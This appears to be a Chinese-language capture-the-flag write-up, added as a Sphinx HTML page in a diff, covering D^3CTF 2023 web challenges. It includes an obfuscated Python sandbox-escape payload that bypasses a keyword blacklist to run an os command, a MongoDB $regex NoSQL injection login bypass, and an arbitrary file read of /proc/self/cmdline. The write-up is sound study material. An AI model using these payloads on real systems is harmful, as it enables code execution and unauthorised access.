@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>D^3CTF 2023 &mdash; CTF 0.0 documentation</title>
+      <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../../../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script src="../../../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js?v=44496db0"></script>
+        <script src="../../../_static/doctools.js?v=888ff710"></script>
+        <script src="../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            CTF
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Lexington-Informatics-Tournament.html">Lexington Informatics Tournament CTF 2023</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">CTF</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">D^3CTF 2023</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../../_sources/source/2023/D^3CTF/README.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="d-3ctf-2023">
+<h1>D^3CTF 2023<a class="headerlink" href="#d-3ctf-2023" title="Permalink to this heading"></a></h1>
+<blockquote>
+<div><p><a class="reference external" href="https://race.d3ctf.cn/contest/1">题目地址</a></p>
+</div></blockquote>
+<section id="web">
+<h2>Web<a class="headerlink" href="#web" title="Permalink to this heading"></a></h2>
+<section id="escape-plan">
+<h3>Escape Plan<a class="headerlink" href="#escape-plan" title="Permalink to this heading"></a></h3>
+<section id="id1">
+<h4>题目描述<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h4>
+</section>
+<section id="id2">
+<h4>题目分析<a class="headerlink" href="#id2" title="Permalink to this heading"></a></h4>
+<p>一个 python 的命令执行题目，但是有黑名单过滤。</p>
+<blockquote>
+<div><p>具体解法应是参考这篇文章：<a class="reference external" href="https://cn-sec.com/archives/1322842.html">Python 沙箱逃逸的通解探索之路 | CN-SEC 中文网</a></p>
+</div></blockquote>
+<p>黑名单具体如下，最后是通过 <code class="docutils literal notranslate"><span class="pre">eval()</span></code> 函数进行命令执行的：</p>
+<p><img alt="image-20230505204602179" src="../../../_images/image-20230505204602179.png" /></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">u</span> <span class="o">=</span> <span class="s1">&#39;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#39;</span>
+
+<span class="n">CMD</span> <span class="o">=</span> <span class="s2">&quot;eval(vars(eval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=()))[len([])]))&quot;</span>
+
+<span class="n">CMD</span> <span class="o">=</span> <span class="n">CMD</span><span class="o">.</span><span class="n">translate</span><span class="p">({</span><span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)):</span> <span class="n">u</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">)})</span>
+</pre></div>
+</div>
+</section>
+<section id="id3">
+<h4>题目复现<a class="headerlink" href="#id3" title="Permalink to this heading"></a></h4>
+<p>发现我拉取镜像失败，不能启动 Docker。</p>
+<p>尝试更换一下 Docker 的镜像源也没用，真的纯搞心态。┭┮﹏┭┮ 黑化了。</p>
+<p>一直都是这个问题：</p>
+<p><img alt="image-20230511170631209" src="../../../_images/image-20230511170631209.png" /></p>
+<p>最后我直接单独 pull 这个镜像，终于进入了构建的下一步：</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>pull<span class="w"> </span>python:3.8-alpine
+</pre></div>
+</div>
+<p><img alt="image-20230511170755134" src="../../../_images/image-20230511170755134.png" /></p>
+<blockquote>
+<div><p>md 还要下好多东西。</p>
+</div></blockquote>
+</section>
+</section>
+<section id="d3-cloud">
+<h3>d3 cloud<a class="headerlink" href="#d3-cloud" title="Permalink to this heading"></a></h3>
+</section>
+<section id="d3-node">
+<h3>d3 node<a class="headerlink" href="#d3-node" title="Permalink to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/nerowander/d3ctf2023-web-d3node">源码链接</a></p></li>
+</ul>
+<section id="id4">
+<h4>环境搭建<a class="headerlink" href="#id4" title="Permalink to this heading"></a></h4>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/nerowander/d3ctf2023-web-d3node.git
+sudo<span class="w"> </span>docker-compose<span class="w"> </span>up<span class="w"> </span>-d
+</pre></div>
+</div>
+<p>等待一会就可以了。</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">10000</span>
+</pre></div>
+</div>
+</section>
+<section id="id5">
+<h4>题目分析<a class="headerlink" href="#id5" title="Permalink to this heading"></a></h4>
+<p>登录页面 F12 发现提示 1。看起来存在 nosql 注入，我们需要绕过 waf 登录一下。</p>
+<p><img alt="image-20230511211433962" src="../../../_images/image-20230511211433962.png" /></p>
+<p><img alt="image-20230511211506460" src="../../../_images/image-20230511211506460.png" /></p>
+<p>不是很理解这一步为什么能想到 nosql，我只能看出来接收 username 和 password 参数。</p>
+<p>后面我用搜索引擎查了以下相关源码关键字：</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">Userinfo</span><span class="p">.</span><span class="n">findOne</span>
+</pre></div>
+</div>
+<p><img alt="image-20230511211850317" src="../../../_images/image-20230511211850317.png" /></p>
+<p>这应该是 MongoDB 数据库的查询语句，而 MongoDB 是 nosql 型也就是非关系型数据库。看到这里我懂了，看来还是对数据库的了解不够，不能够立即辨认出提示图片给的源码是 MongoDB 的查询语句。</p>
+<p><img alt="image-20230511212211697" src="../../../_images/image-20230511212211697.png" /></p>
+<p><img alt="image-20230511212152664" src="../../../_images/image-20230511212152664.png" /></p>
+<p>很好，现在在网上寻找有关 MongoDB 注入的文章进行学习吧。</p>
+<p>建议参看先知社区<a class="reference external" href="https://xz.aliyun.com/t/9908">这篇</a>，完成从零到一。</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span>{&quot;username&quot;: {&quot;$regex&quot;: &quot;admin&quot;}, &quot;password&quot;: {&quot;$regex&quot;: &quot;&quot; }}
+</pre></div>
+</div>
+<p>登录进去发现提示 2，告诉我们存在任意文件读取漏洞。</p>
+<div class="highlight-http notranslate"><div class="highlight"><pre><span></span>/dashboardIndex/ShowExampleFile?filename=/proc/self/cmdline
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2023, MirRoR4s.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
